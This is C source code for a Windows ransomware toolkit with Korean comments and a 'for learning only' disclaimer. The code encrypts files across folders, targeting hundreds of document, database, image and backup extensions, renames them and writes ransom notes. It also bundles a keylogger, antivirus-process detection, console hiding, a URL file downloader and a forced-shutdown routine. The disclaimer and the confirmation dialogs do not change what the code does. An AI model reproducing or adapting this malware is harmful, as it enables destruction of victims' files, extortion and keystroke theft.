/*
버전:12.0.8
이 프로그램은 키 갚을 가지고 간단하게 아스키 코드값을 이용하여
지정된 폴더 안에 있는 모든 파일을
암호화 하는 랜섬웨어입니다.
#주의
이 프로그램을 악용시 가해지는 책임은 제작자가 책임지지 않습니다.
절대 이 소스코드를 수정하거나 크랙하여 재배포를 금지합니다.
또한 만일 불가피하게 수정시 반드시 실행전 경고를 띄우도록 합니다.
랜섬웨어를 제작하면 절대 바이러스 토탈, 블로그 등의 온라인에 배포하지 마십시오.
다시 강조하지만 이 프로그램은 충분한 사전경고를 하고 사용자가 이를 받아들여야지만 암호화가 진행됩니다.
	  ///////////         ////       ////   //    /////////     ///////   ////      ////    ///////////
	  //       //        //  //      // //  //   //       //   //    //   // //    // //    //
	  ///////////       //    //     //  // //   //            //    //   //  // //   //    ///////////
	  //    //         /////////     //   ////    /////////    //    //   //   ///    //    ///////////
	  //     //       //       //    //    ///            //   //    //   //          //    //
	  //      //     //         //   //     //   //////////     //////    //          //    ///////////
	  이 프로그램은 '학습용'이며, 절대로 악용하지 마십시오.
사용법 : Ransomeware(암호화할 경로, 바꿀 확장자, 확장자의 문자 길이, 암호화를 할 때 필요한 키, 키의 길이, 옵션(ENCRIPT=암호화하기, DECRIPT=복호화하기));
또한 절대로 시스템 디렉터리를 암호화하지 마십시오.
*/

#pragma warning ( disable : 4996 )

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <io.h>
#include <urlmon.h>
#include <time.h>
#include <tchar.h>
#include <Windows.h>
#include <direct.h>
#include <errno.h>
#include<Winuser.h>
#include <TlHelp32.h>
#include<mmsystem.h>

using namespace std;

#pragma comment(lib, "Urlmon.lib")
#pragma comment( lib, "user32.lib" ) 
#pragma comment(lib, "winmm.lib")

#define MAX_PATH 360
#define MAX_BLOCKSIZE 256
#define FILELISTSIZE 3492

#define ALYAC L"ALYac_UpdSrv.exe"
#define AHNLAB L"ASDSvc.exe"
#define AVAST L"AvastSvc.exe"

#define ENCRIPT 1
#define DECRIPT 2

#define CANREAD 1
#define NORMAL 2

#define SHUTDOWN 1
#define REBOOT 2

FILE* fout = fopen("Data.txt", "w");
FILE* fin = NULL, * FileLine = NULL, * Note = NULL;
FILE* getFile = NULL, * savedata = NULL, * makeEn = NULL, * FileData = NULL, * FL = NULL, * Ransomenote = NULL, * reg = NULL, * Backup = NULL;

struct _finddata_t fd;

char NormalFileList[FILELISTSIZE] = { ".txt.doc.docx.xls.xlsx.ppt.pptx.pst.ost.msg.em.vsd.vsdx.csv.rtf.123.wks.wk1.pdf.dwg.onetoc2.snt.docb.docm.dot.dotm.dotx.xlsm.xlsb.xlw.xlt.xlm.xlc.xltx.xltm.pptm.pot.pps.ppsm.ppsx.ppam.potx.potm.edb.hwp.602.sxi.sti.sldx.sldm.vdi.vmx.gpg.aes.raw.cgm.nef.psd.ai.svg.djvu.sh.class.jar.java.rb.asp.php.jsp.brd.sch.dch.dip.p.vb.vbs.ps1.js.asm.h.pas.cpp.c.cs.suo.sln.ldf.mdf.ibd.myi.myd.frm.odb.dbf.db.mdb.accdb.sq.sqlitedb.sqlite3.asc.lay6.lay.mm.sxm.otg.odg.uop.std.sxd.otp.odp.wb2.slk.dif.stc.sxc.ots.ods.3dm.max.3ds.uot.stw.sxw.ott.odt.pem.p12.csr.crt.key.pfx.der.1cd.cd.arw.jpe.eq.adp.odm.dbc.frx.db2.dbs.pds.pdt.dt.cf.cfu.mx.epf.kdbx.erf.vrp.grs.geo.st.pff.mft.efd.rib.ma.lwo.lws.m3d.mb.obj.x.x3d.c4d.fbx.dgn.4db.4d.4mp.abs.adn.a3d.aft.ahd.alf.ask.awdb.azz.bdb.bib.bnd.bok.btr.cdb.ckp.clkw.cma.crd.dad.daf.db3.dbk.dbt.dbv.dbx.dcb.dct.dcx.dd.df1.dmo.dnc.dp1.dqy.dsk.dsn.dta.dtsx.dx.eco.ecx.emd.fcd.fic.fid.fi.fm5.fo.fp3.fp4.fp5.fp7.fpt.fzb.fzv.gdb.gwi.hdb.his.ib.idc.ihx.itdb.itw.jtx.kdb.lgc.maq.mdn.mdt.mrg.mud.mwb.s3m.ndf.ns2.ns3.ns4.nsf.nv2.nyf.oce.oqy.ora.orx.owc.owg.oyx.p96.p97.pan.pdb.pdm.phm.pnz.pth.pwa.qpx.qry.qvd.rctd.rdb.rpd.rsd.sbf.sdb.sdf.spq.sqb.stp.str.tcx.tdt.te.tmd.trm.udb.usr.v12.vdb.vpd.wdb.wmdb.xdb.xld.xlgc.zdb.zdc.cdr.cdr3.abw.act.aim.ans.apt.ase.aty.awp.awt.aww.bad.bbs.bdp.bdr.bean.bna.boc.btd.cnm.crw.cyi.dca.dgs.diz.dne.docz.dsv.dvi.dx.eio.eit.emlx.epp.err.etf.etx.euc.faq.fb2.fb.fcf.fdf.fdr.fds.fdt.fdx.fdxt.fes.fft.flr.fodt.gtp.frt.fwdn.fxc.gdoc.gio.gpn.gsd.gthr.gv.hbk.hht.hs.htc.hz.idx.ii.ipf.jis.joe.jp1.jrtf.kes.klg.knt.kon.kwd.lbt.lis.lit.lnt.lp2.lrc.lst.ltr.ltx.lue.luf.lwp.lyt.lyx.man.map.mbox.me.mel.min.mnt.mwp.nfo.njx.now.nzb.ocr.odo.of.oft.ort.p7s.pfs.pjt.prt.psw.pu.pvj.pvm.pwi.pwr.qd.rad.rft.ris.rng.rpt.rst.rt.rtd.rtx.run.rzk.rzn.saf.sam.scc.scm.sct.scw.sdm.sdoc.sdw.sgm.sig.sla.sls.smf.sms.ssa.sty.sub.sxg.tab.tdf.tex.text.thp.tlb.tm.tmv.tmx.tpc.tvj.u3d.u3i.unx.uof.upd.utf8.utxt.vct.vnt.vw.wbk.wcf.wgz.wn.wp.wp4.wp5.wp6.wp7.wpa.wpd.wp.wps.wpt.wpw.wri.wsc.wsd.wsh.wtx.xd.xlf.xps.xwp.xy3.xyp.xyw.ybk.ym.zabw.zw.abm.afx.agif.agp.aic.albm.apd.apm.apng.aps.apx.art.asw.bay.bm2.bmx.brk.brn.brt.bss.bti.c4.ca.cals.can.cd5.cdc.cdg.cimg.cin.cit.colz.cpc.cpd.cpg.cps.cpx.cr2.ct.dc2.dcr.dds.dgt.dib.djv.dm3.dmi.vue.dpx.wire.drz.dt2.dtw.dv.ecw.eip.exr.fa.fax.fpos.fpx.g3.gcdp.gfb.gfie.ggr.gih.gim.spr.scad.gpd.gro.grob.hdp.hdr.hpi.i3d.icn.icon.icpr.iiq.info.ipx.itc2.iwi.j.j2c.j2k.jas.jb2.jbig.jbmp.jbr.jfif.jia.jng.jp2.jpg2.jps.jpx.jtf.jw.jxr.kdc.kdi.kdk.kic.kpg.lbm.ljp.mac.mbm.mef.mnr.mos.mpf.mpo.mrxs.my.ncr.nct.nlm.nrw.oc3.oc4.oc5.oci.omf.oplc.af2.af3.asy.cdmm.cdmt.cdmz.cdt.cmx.cnv.csy.cv5.cvg.cvi.cvs.cvx.cwt.cxf.dcs.ded.dhs.dpp.drw.dxb.dxf.egc.emf.ep.eps.epsf.fh10.fh11.fh3.fh4.fh5.fh6.fh7.fh8.fif.fig.fmv.ft10.ft11.ft7.ft8.ft9.ftn.fxg.gem.glox.hpg.hpg.hp.idea.igt.igx.imd.ink.lmk.mgcb.mgmf.mgmt.mt9.mgmx.mgtx.mmat.mat.ovp.ovr.pcs.pfv.plt.vrm.pobj.psid.rd.scv.sk1.sk2.ssk.stn.svf.svgz.tlc.tne.ufr.vbr.vec.vm.vsdm.vstm.stm.vstx.wpg.vsm.xar.ya.orf.ota.oti.ozb.ozj.ozt.pa.pano.pap.pbm.pc1.pc2.pc3.pcd.pdd.pe4.pef.pfi.pgf.pgm.pi1.pi2.pi3.pic.pict.pix.pjpg.pm.pmg.pni.pnm.pntg.pop.pp4.pp5.ppm.prw.psdx.pse.psp.ptg.ptx.pvr.px.pxr.pz3.pza.pzp.pzs.z3d.qmg.ras.rcu.rgb.rgf.ric.riff.rix.rle.rli.rpf.rri.rs.rsb.rsr.rw2.rw.s2mv.sci.sep.sfc.sfw.skm.sld.sob.spa.spe.sph.spj.spp.sr2.srw.wallet.jpeg.jpg.vmdk.arc.paq.bz2.tbk.bak.tar.tgz.gz.7z.rar.zip.backup.iso.vcd.bmp.png.gif.tif.tiff.m4u.m3u.mid.wma.flv.3g2.mkv.3gp.mp4.mov.avi.asf.mpeg.vob.mpg.wmv.fla.swf.wav.mp3" };

void PlayMusic(LPCWSTR path);
bool FindVacin();
int Save(int key, char* file);
void KeyLogger(char FileName[MAX_PATH]);
int FileSize(FILE* file);
int getFileLine(FILE* file);
bool ProcessChk(WCHAR A[MAX_BLOCKSIZE]);
char* FindKey(FILE* EncriptFile, FILE* NormalFile);
void ShutdownNow(int option);
void BackupInfo(char path[MAX_PATH], char key[MAX_BLOCKSIZE], char name[MAX_PATH], int option);
bool chkFilename(char A[MAX_PATH], char list[FILELISTSIZE]);
void DownloadFiles(LPCWSTR url, LPCWSTR path);
void HideConsole();
void RansomeNote(char filename[MAX_PATH], char msg[MAX_BLOCKSIZE]);
int getRandomNum(int s, int e);
void getRandomKey(char* A, int length);
int isFileOrDir();
void textcolor(int color_number);
void FileSearch(char file_path[], char name[MAX_PATH], int namesize, int option);
void get_path(char file_path[MAX_PATH], char name[MAX_PATH], int namesize, int option);
void Ransomeware(char path[MAX_PATH], char name[MAX_PATH], char key[MAX_BLOCKSIZE], int option);

void PlayMusic(LPCWSTR path)
{
	PlaySound(path, NULL, SND_FILENAME | SND_ASYNC | SND_LOOP);
	//사운드 파일 위치, SND_ASYNC, SND_LOOP 세가지가 제일 중요
	//SND_ASYNC : 재생하면서 다음코드 실행
	//SND_LOOP : 반복재생
	while (1)
	{
		int a;
		printf("노래를 종료하시겠습니까?(종료 : 1)\n입력 : ");
		scanf("%d", &a);
		if (a)
		{
			PlaySound(NULL, 0, 0);
			Sleep(1000);
			printf("노래를 종료했습니다.");
			return;
		}
	}
}

bool FindVacin()
{
	if (ProcessChk(ALYAC) || ProcessChk(AHNLAB) || ProcessChk(AVAST)) return true;
	else return false;
}

int Save(int key, char* file)
{
	if ((key == 1) || (key == 2)) return 0;
	FILE* ptr;
	ptr = fopen(file, "a+");
	if (key == 8) fprintf(ptr, "%s", "[BackSpace]");
	else if (key == 13)fprintf(ptr, "%s", "\n");
	else if (key == 32) fprintf(ptr, "%s", " ");
	else if (key == VK_TAB) fprintf(ptr, "%s", "[TAB]");
	else if (key == VK_SHIFT) fprintf(ptr, "%s", "[SHIFT]");
	else if (key == VK_CONTROL) fprintf(ptr, "%s", "[CONTROL]");
	else if (key == VK_ESCAPE) fprintf(ptr, "%s", "[ESCAPE]");
	else if (key == VK_END) fprintf(ptr, "%s", "[END]");
	else if (key == VK_HOME) fprintf(ptr, "%s", "HOME");
	else if (key == VK_LEFT) fprintf(ptr, "%s", "[LEFT]");
	else if (key == VK_UP) fprintf(ptr, "%s", "[UP]");
	else if (key == VK_RIGHT) fprintf(ptr, "%s", "[RIGHT]");
	else if (key == VK_DOWN) fprintf(ptr, "%s", "[DOWN]");
	else if (key == 190 || key == 110) fprintf(ptr, "%s", ".");
	else fprintf(ptr, "%c", key);
	fclose(ptr);
	return 0;
}

void KeyLogger(char FileName[MAX_PATH])
{
	char i;
	printf("KeyLogging...");
	while (1)
	{
		for (i = 8; i <= 190; i++)
		{
			if (GetAsyncKeyState(i) == -32767) Save(i, FileName);
		}
	}
	return;
}

int FileSize(FILE* file)
{
	int n, cnt = 0;
	while ((n = fgetc(file)) != EOF) cnt++;
	fclose(file);
	return cnt;
}

int getFileLine(FILE* file)
{
	int n, cnt = 0;
	while (1)
	{
		n = fgetc(file);
		if (n == EOF) break;
		if (n == '\n') cnt++;
	}
	fclose(file);
	return cnt;
}

bool ProcessChk(WCHAR A[MAX_BLOCKSIZE])
{
	HANDLE hProcess = NULL;
	PROCESSENTRY32 pe32 = { 0 };
	hProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	pe32.dwSize = sizeof(PROCESSENTRY32);
	if (Process32First(hProcess, &pe32))
	{
		while (Process32Next(hProcess, &pe32))
		{
			if (wcscmp(pe32.szExeFile, A) == 0)
			{
				CloseHandle(hProcess);
				return true;
			}
		}
	}
	else {
		printf("???\n");
	}
	CloseHandle(hProcess);
	return false;
}

char* FindKey(FILE* EncriptFile, FILE* NormalFile)
{
	int i, n, m, keysize;
	static char A[MAX_BLOCKSIZE] = { NULL };
	fscanf(EncriptFile, "%d", &keysize);
	for (i = 0; i < keysize; i++)
	{
		n = fgetc(EncriptFile);
		m = fgetc(NormalFile);
		A[i] = n - m;
	}
	return A;
}

void ShutdownNow(int option)
{
	if (option == SHUTDOWN) system("shutdown -s -t 1");
	else if (option == REBOOT) system("shutdown -r");
	return;
}

void BackupInfo(char path[MAX_PATH], char key[MAX_BLOCKSIZE], char name[MAX_PATH], int option)
{
	mkdir("C:\\Program Files\\RansomewareInfoBackup");
	Backup = fopen("C:\\Program Files\\RansomewareInfoBackup\\RansomewareIntoBackup.txt", "wb");
	fprintf(Backup, "This File is include this ransomeware Info to use Who use this program bad side\nPath : %s\nkey : %s\nname : %s\noption : %d\n", path, key, name, option);
	fclose(Backup);
	return;
}

bool chkFilename(char A[MAX_PATH], char list[FILELISTSIZE])
{
	int i, cnt = -1, t = 0, c = 0;
	char B[MAX_BLOCKSIZE] = { NULL };
	while (A[++cnt]);
	for (i = cnt; i >= 0; i--)
	{
		if (A[i] == '.')
		{
			t = i;
			break;
		}
	}
	for (i = t; i <= cnt; i++)
	{
		B[c] = A[i];
		c++;
	}
	if (strstr(list, B) != NULL) return true;
	else return false;
}

void DownloadFiles(LPCWSTR url, LPCWSTR path)
{
	URLDownloadToFile(NULL, url, path, 0, NULL);
	return;
}

void HideConsole()
{
	HWND hConsole = GetConsoleWindow();
	ShowWindow(hConsole, SW_HIDE);
	return;
}

void RansomeNote(char filename[MAX_PATH], char msg[MAX_BLOCKSIZE])
{
	Ransomenote = fopen(filename, "wb");
	fprintf(Ransomenote, "%s", msg);
	fclose(Ransomenote);
	return;
}

int getRandomNum(int s, int e)
{
	return rand() % (e - s + 1) + s;
}

void getRandomKey(char* A, int length)
{
	srand(time(NULL));
	for (int i = 0; i < length; i++)
	{
		A[i] = getRandomNum(0, 25) + 'a';
	}
	A[length] = 0;
}

int isFileOrDir()
{
	if (fd.attrib & _A_SUBDIR)
		return 0; // 디렉토리면 0 반환
	else
		return 1; // 그밖의 경우는 "존재하는 파일"이기에 1 반환

}

void textcolor(int color_number)
{
	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), color_number);
}

void FileSearch(char file_path[], char name[MAX_PATH], int namesize, int option)
{
	intptr_t handle;
	int check = 0, cnt = 0, i = 0, cnt1 = 0;
	char file_path2[MAX_PATH];

	strcat(file_path, "\\");
	strcpy(file_path2, file_path);
	strcat(file_path, "*");

	if ((handle = _findfirst(file_path, &fd)) == -1)
	{
		return;
	}

	while (_findnext(handle, &fd) == 0)
	{
		char A[MAX_PATH];
		strcpy(A, file_path2);
		strcat(A, fd.name);

		check = isFileOrDir();    //파일인지 디렉토리 인지 식별

		if (check == 0 && fd.name[0] != '.')
		{
			char out[MAX_PATH] = { NULL };
			cnt1 = -1;
			while (A[++cnt1]);
			if (A[cnt1 - 1] == 'e' && A[cnt1 - 2] == 's' && A[cnt1 - 3] == 'p' && A[cnt1 - 4] == 'i' && A[cnt1 - 5] == 'l' && A[cnt1 - 6] == 'c' && A[cnt1 - 7] == 'e') continue; //ProgramData
			if (A[cnt1 - 1] == 'a' && A[cnt1 - 2] == 't' && A[cnt1 - 3] == 'a' && A[cnt1 - 4] == 'D' && A[cnt1 - 5] == 'm' && A[cnt1 - 6] == 'a' && A[cnt1 - 7] == 'r' && A[cnt1 - 8] == 'g' && A[cnt1 - 9] == 'o' && A[cnt1 - 10] == 'r' && A[cnt1 - 11] == 'P') continue;//Windows
			if (A[cnt1 - 1] == 's' && A[cnt1 - 2] == 'w' && A[cnt1 - 3] == 'o' && A[cnt1 - 4] == 'd' && A[cnt1 - 5] == 'n' && A[cnt1 - 6] == 'i' && A[cnt1 - 7] == 'W') continue; //Temp
			if (A[cnt1 - 1] == 'p' && A[cnt1 - 2] == 'm' && A[cnt1 - 3] == 'e' && A[cnt1 - 4] == 'T') continue;
			if (A[cnt1 - 1] == ')' && A[cnt1 - 2] == '6' && A[cnt1 - 3] == '8' && A[cnt1 - 4] == 'x' && A[cnt1 - 5] == '(' && A[cnt1 - 6] == ' ' && A[cnt1 - 7] == 's' && A[cnt1 - 8] == 'e' && A[cnt1 - 9] == 'l' && A[cnt1 - 10] == 'i' && A[cnt1 - 11] == 'F' && A[cnt1 - 12] == ' ' && A[cnt1 - 13] == 'm' && A[cnt1 - 14] == 'a' && A[cnt1 - 15] == 'r' && A[cnt1 - 16] == 'g' && A[cnt1 - 17] == 'o' && A[cnt1 - 18] == 'r' && A[cnt1 - 19] == 'P') continue;//Program Files (x86)
			if (A[cnt1 - 2] == 'n' && A[cnt1 - 3] == 'i' && A[cnt1 - 4] == 'B' && A[cnt1 - 5] == '.' && A[cnt1 - 6] == 'e' && A[cnt1 - 7] == 'l' && A[cnt1 - 8] == 'c' && A[cnt1 - 9] == 'y' && A[cnt1 - 10] == 'c' && A[cnt1 - 11] == 'e' && A[cnt1 - 12] == 'R' && A[cnt1 - 13] == 36 && A[cnt1 - 15] == ':' && A[cnt1 - 16] == 'C') continue;
			for (i = 0; i < cnt1; ++i)//만일 디렉토리 중 띄어쓰기가 있으면 _로 바꾼다(그래야 인식합니다
			{
				if (A[i] == ' ') out[i] = '_';
				else out[i] = A[i];
			}
			rename(A, out);
			printf("폴더 %s 를 찾았습니다.\n", out);
			FileSearch(out, name, namesize, option);    //하위 디렉토리 검색 재귀함수
		}
		else if (check == 1 && fd.size != 0 && fd.name[0] != '.')
		{
			int pass = 0, ischange = 0, isencript = 1;
			char out[MAX_PATH] = { NULL };
			cnt = -1;
			while (A[++cnt]);
			for (i = 0; i < cnt; ++i)//공백 검사
			{
				if (A[i] == ' ')
				{
					out[i] = '_';
					ischange = 1;
				}
				else out[i] = A[i];
			}
			if (option == DECRIPT)
			{
				if (chkFilename(out, name) == 0) continue;
				for (i = cnt - 1; i > cnt - 1 - namesize; i--)
				{
					out[i] = NULL;
				}
			}
			if (option == ENCRIPT)
			{
				if (chkFilename(A, NormalFileList) == 0) pass = 1;
				for (i = 0; i < namesize; i++)
				{
					out[cnt + i] = name[i];
				}
			}
			if (option == ENCRIPT && pass == 1) continue;
			rename(A, out);
			printf("파일 %s 를 찾았습니다.\n", out);
			fprintf(fout, "%s\n", out);
		}
	}
	_findclose(handle);
}

void get_path(char file_path[MAX_PATH], char name[MAX_PATH], int namesize, int option)
{
	int n, cnt = 0;

	FileSearch(file_path, name, namesize, option);//검색 시작
	fcloseall();
	fin = fopen("Data.txt", "rb");//편집 전
	fout = fopen("FileData.txt", "wb");//편집 후
	FL = fopen("Fileline.txt", "wb");//파일 줄
	while (1)
	{
		n = fgetc(fin);
		if (n == EOF) break;
		if (n == 92) fputc(n, fout);
		if (n == '\n') cnt++;
		fputc(n, fout);
	}
	fprintf(FL, "%d", cnt);
	fcloseall();
}

void Ransomeware(char path[MAX_PATH], char name[MAX_PATH], char key[MAX_BLOCKSIZE], int option)
{
	int n, fd = 0, fl = 0, i, cnt, c = 0, l = 0, l2 = 0, c1 = 0, namesize = -1, KeyLength = -1;
	char A[151];
	while (name[++namesize]);
	while (key[++KeyLength]);
	int check = MessageBox(NULL, L"이 프로그램은 랜섬웨어입니다. 취소를 누르면 이 프로그램은 실행되지 않습니다. 그러나 이 프로그램을 실행시키면 파일이 임의로 수정될 수 있습니다. 부디 지정된 폴더나 가상머신에서 실행하십시오. 예를 눌렀을 때 발생하는 모든 문제는 책임지지 않습니다. 그래도 실행하시겠습니까?", L"경고", MB_ICONEXCLAMATION | MB_OKCANCEL);
	if (check != IDOK) exit(1);
	check = MessageBox(NULL, L"파일이 손상되어 복구를 못 할 수도 있습니다. 그래도 정말 계속하시겠습니까?", L"경고", MB_ICONEXCLAMATION | MB_OKCANCEL);
	if (check != IDOK) exit(1);
	BackupInfo(path, key, name, option);
	get_path(path, name, namesize, option);
	FileData = fopen("FileData.txt", "rb");
	FileLine = fopen("FileLine.txt", "rb");
	fscanf(FileLine, "%d", &fl);
	printf("키 값 : %s\n", key);
	for (i = 0; i < fl; ++i)
	{
		fscanf(FileData, "%s", &A);
		getFile = fopen(A, "rb");
		savedata = fopen("savedata.txt", "wb");
		if (getFile == NULL || savedata == NULL) break;
		if (option == ENCRIPT) printf("파일 %s 의 암호화를 진행중입니다. 중단하려면 이 창을 닫아 주십시오.\n", A);
		else if (option == DECRIPT) printf("파일 %s 의 복호화를 진행중입니다. 중단하려면 이 창을 닫아 주십시오.\n", A);
		if (option == DECRIPT)
		{
			int temp;
			fscanf(getFile, "%d", &temp);
		}
		while ((n = fgetc(getFile)) != EOF)
		{
			if (option == ENCRIPT) n += key[c];//암호화
			else if (option == DECRIPT) n -= key[c];//복호화
			fputc(n, savedata);
			if (c >= KeyLength) c = 0;
			else c++;
		}
		if (option == ENCRIPT) printf("파일 %s 의 암호화가 끝났습니다.\n", A);
		else if (option == DECRIPT) printf("파일 %s 의 복호화가 끝났습니다.\n", A);
		fclose(getFile);
		fclose(savedata);
		makeEn = fopen(A, "wb");
		savedata = fopen("savedata.txt", "rb");
		printf("파일 %s 에 변경사항을 저장합니다.\n", A);
		if (option == ENCRIPT) fprintf(makeEn, "%d", KeyLength);
		while (1)
		{
			n = fgetc(savedata);
			if (n == EOF) break;
			fputc(n, makeEn);
		}
		fclose(makeEn);
		fclose(savedata);
		if (option == ENCRIPT) printf("파일 %s 의 암호화가 모두 끝났습니다.\n", A);
		else if (option == DECRIPT) printf("파일 %s 의 복호화가 모두 끝났습니다.\n", A);
	}
	fcloseall();
	return;
}
